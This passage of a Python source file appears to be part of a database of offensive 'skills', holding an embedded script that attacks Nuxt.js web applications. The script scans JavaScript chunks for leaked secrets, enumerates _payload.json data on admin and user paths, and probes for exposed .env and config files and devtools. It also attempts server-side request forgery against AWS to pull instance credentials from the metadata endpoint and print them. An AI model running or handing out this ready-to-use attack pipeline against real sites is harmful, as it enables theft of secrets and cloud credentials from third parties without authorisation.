                            results["secrets"].append({{"type": label, "value": m}})
                except Exception:
                    pass
        except Exception:
            pass

# ── Phase 3: JS Chunks ────────────────────────────────────────────────────────
print("\\n[Phase 3] JS Chunk Secret Scan...")
for chunk in chunks[:30]:
    url = f"{{TARGET}}/_nuxt/{{chunk}}"
    try:
        r = session.get(url, timeout=8)
        if r.status_code == 200:
            for pat, label in SECRET_PATTERNS:
                for m in set(re.findall(pat, r.text))[:2]:
                    if len(str(m)) > 8:
                        print(f"  [JS SECRET] {{label}}: {{str(m)[:60]}}")
                        results["secrets"].append({{"type": label, "value": m}})
    except Exception:
        pass

# ── Phase 4: _payload.json ────────────────────────────────────────────────────
print("\\n[Phase 4] _payload.json Enumeration...")
payload_paths = ["/", "/admin", "/dashboard", "/user", "/users",
                 "/profile", "/settings", "/products", "/orders", "/data"]
links = re.findall(r'href=["\\']([/\\w\\-]+)["\\'\\s>]', resp.text)
payload_paths += [l for l in links if l.startswith("/") and "." not in l.split("/")[-1]]
for path in list(set(payload_paths))[:20]:
    url = f"{{TARGET}}{{path}}/_payload.json"
    try:
        r = session.get(url, timeout=8)
        if r.status_code == 200 and "json" in r.headers.get("content-type",""):
            print(f"  [PAYLOAD] {{url}}")
            results["payloads"].append(url)
            flat = r.text.lower()
            if any(k in flat for k in ["password","token","secret","hash","admin"]):
                print(f"    [!] SENSITIVE DATA in payload!")
    except Exception:
        pass

# ── Phase 5: Config Files ─────────────────────────────────────────────────────
print("\\n[Phase 5] Config File Exposure...")
for path in ["/.env","/.env.local","/.env.production","/nuxt.config.js","/nuxt.config.ts"]:
    url = f"{{TARGET}}{{path}}"
    try:
        r = session.get(url, timeout=8)
        if r.status_code == 200 and len(r.text) > 20:
            print(f"  [CONFIG] {{url}} ({{len(r.text)}} bytes)")
            results["config_files"].append(url)
    except Exception:
        pass

# ── Phase 6: DevTools ─────────────────────────────────────────────────────────
print("\\n[Phase 6] DevTools Detection...")
for path in ["/__nuxt_devtools__/client/","/__nuxt_devtools__/","/__nuxt__/"]:
    url = f"{{TARGET}}{{path}}"
    try:
        r = session.get(url, timeout=8)
        if r.status_code in (200, 301):
            print(f"  [DEVTOOLS] EXPOSED: {{url}}")
    except Exception:
        pass

# ── Phase 7: AWS SSRF ─────────────────────────────────────────────────────────
if "awsapprunner" in TARGET or "amazonaws" in TARGET:
    print("\\n[Phase 7] AWS Metadata SSRF...")
    aws_meta = "http://169.254.170.23/v1/credentials"
    for param in ["?url=", "?redirect=", "?src="]:
        url = f"{{TARGET}}/api{{param}}{{aws_meta}}"
        try:
            r = session.get(url, timeout=8)
            if r.status_code == 200 and "AccessKeyId" in r.text:
                print(f"  [SSRF CONFIRMED] {{url}}")
                print(f"  Credentials: {{r.text[:300]}}")
        except Exception:
            pass

# ── Final Summary ─────────────────────────────────────────────────────────────
print("\\n" + "=" * 70)
print("[PIPELINE COMPLETE] Summary:")
print(f"  Secrets found:      {{len(results['secrets'])}}")
print(f"  Payload files:      {{len(results['payloads'])}}")
print(f"  Config exposed:     {{len(results['config_files'])}}")
print(f"  API routes found:   {{len(results['routes'])}}")
if results["secrets"] or results["payloads"] or results["config_files"]:
    print("\\n[!] VULNERABILITIES FOUND — review output above for details")
else:
    print("\\n[-] No critical findings — target may be well-configured")
''',
    },
}

# ── Index builders ────────────────────────────────────────────────────────────

MODULE_INDEX_13: dict[str, list[str]] = {}
TAG_INDEX_13:    dict[str, list[str]] = {}

for _sid, _skill in SKILLS_DB_13.items():
    _mod = _skill.get("module", "")
    if _mod:
        MODULE_INDEX_13.setdefault(_mod, []).append(_sid)
    for _tag in _skill.get("tags", []):
        TAG_INDEX_13.setdefault(_tag.lower(), []).append(_sid)
